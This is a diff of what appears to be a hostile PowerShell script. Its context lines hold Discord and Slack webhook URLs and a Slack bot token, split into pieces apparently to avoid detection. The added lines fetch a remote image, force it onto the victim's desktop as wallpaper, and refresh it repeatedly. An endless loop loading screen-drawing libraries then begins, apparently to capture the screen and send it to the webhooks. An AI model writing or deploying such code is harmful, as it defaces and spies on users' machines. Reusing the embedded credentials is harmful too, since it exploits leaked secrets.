@@ -2,6 +2,11 @@ $dwbt='https://discord.com/api/webhooks/10779346' + '36958744617/zh07WaxN4jLLI1Z
 $swbt='https://hooks.slack.com/services/T08F0' + '53J6G5/B08FXT4AHU0/MhBJ6ZQkjW5dzKwDi6yow9FB'
 $sat = "xoxb-8510173618549-855156999" + "8048-9VGiG8Blv8C7OABqVo9xP9m5"
 
+$p=$home + '\AppData\Local\Temp' + '\b.jpg';
+iwr https://raw.githubusercontent.com/BTSEcomm/btse-api/refs/heads/main/Wallpaper.png -O $p;
+SP 'HKCU:Control Panel\Desktop' WallPaper $p;
+1..59|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}
+
 while(1){
   Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
